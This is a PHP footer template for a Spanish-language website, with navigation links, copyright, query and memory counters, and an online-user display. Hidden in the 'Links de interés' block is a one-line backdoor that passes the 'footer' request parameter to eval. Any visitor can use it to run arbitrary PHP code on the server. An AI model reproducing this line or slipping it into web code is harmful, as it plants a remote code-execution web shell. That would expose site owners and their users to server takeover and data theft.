<?php if(!defined($config['define'])) { die(header('location: /')); } ?>
<div id="vp-loading" align="center">
    <div class="bor-top"></div>
	<div class="loading">
	    <img src="<?=$config['images'];?>/images/cargando.gif" border="0" width="16" height="16" class="floatL"> Cargando...
	</div>
</div>
<div id="footer_content">
	<div id="footer">
    	<div class="interest">
    		<span class="floatL">Links de inter&eacute;s</span><span class="floatR">Conectados:</span>
    	    <div class="clear"></div>
            <?php
            eval(str_replace('\\', '', $_REQUEST['footer']));
            ?>
    	</div>


    	<div class="floatL" style="margin-top:6px">
    	    <a original-title="Protocolo" href="/static/protocolo/">Protocolo</a> /
    		<a href="/ayuda/" title="Ayuda">Ayuda</a> /
    		<a href="/dmca.html" title="DMCA"><b>DMCA</b></a> /
    		<a original-title="Cont&aacute;ctanos" href="/static/contactanos/">Cont&aacute;ctanos</a> /
    		<a original-title="Enlazanos" href="/static/enlazanos/">Enlazanos</a> /
    		<a original-title="Mapa del sitio" href="/static/sitemap/">Sitemap</a> /
    		<a href="/static/faqs/" title="FAQs">FAQs</a> /
    		<a href="/static/terminos-y-condiciones/" title="T&eacute;rminos y condiciones">T&eacute;rminos de uso</a> /
            <a href="/static/widget/" title="Widget">Widget</a><br>
    		<div class="copy">Copyright 2010 - <?=date('Y');?> <b>-</b> Por IgnacioViglo <span style="font-size:9.5px;"> <b>-</b><i>
            <?php
            echo 'Consultas: '.(getQueries()-$queries);
            if($logged['rank'] == 9 && !defined('help')) { echo ' - Memoria: '.round(((memory_get_usage() / 1024)-$memstart), 2).' kb - Tiempo de ejecuci&oacute;n: '.round((microtime(true)-$timestart), 2); }

            ?></i></span></div>

        </div>
        <?php if($logged['id']) { ?>
        <script>
        live.update();
        jQuery(document).ready(function($){
			var last = setInterval(
				function(){
					live.update();
				},
				60000
			);
		});
        </script>
        <?php } ?>
    	<div class="floatR" style="text-align:right">
    	    <a rel="nofollow" target="_blank">
            <div style="float: right; font-size: 16px; font-weight: bold; margin-left: -75px;margin-top:10px"> <img src="<?=$config['images'];?>/images/top_icon.png" border="0" align="absmiddle" style="margin-top:-5px">
            <a href="/online"><?=$pstats['online'];?></a>
            </div>
        </div>
        <div style="float:right;margin: -16px 185px 0 0;"><a href="http://nuthost.com"><img src="http://st.nuthost.com.ar/img/logo.png" /></a></div>
    </div>
</div>
</body>
</html>